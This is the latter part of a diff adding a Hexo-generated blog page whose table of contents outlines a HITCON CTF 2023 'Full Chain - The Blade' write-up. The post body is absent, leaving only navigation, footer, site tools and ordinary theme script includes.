+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#HITCON-CTF-2023-Full-Chain-The-Blade"><span class="nav-text">HITCON-CTF-2023 - Full Chain - The Blade</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Description"><span class="nav-text">Description</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Source"><span class="nav-text">Source</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x1-Initial-Reconnaissance"><span class="nav-text">0x1 Initial Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-Reverse-Engineering"><span class="nav-text">0x2 Reverse Engineering</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#prompt"><span class="nav-text">prompt()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#verify"><span class="nav-text">verify()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x3-Exploitation"><span class="nav-text">0x3 Exploitation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x4-Exploits"><span class="nav-text">0x4 Exploits</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x5-Summary"><span class="nav-text">0x5 Summary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x6-References"><span class="nav-text">0x6 References</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">kazma</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
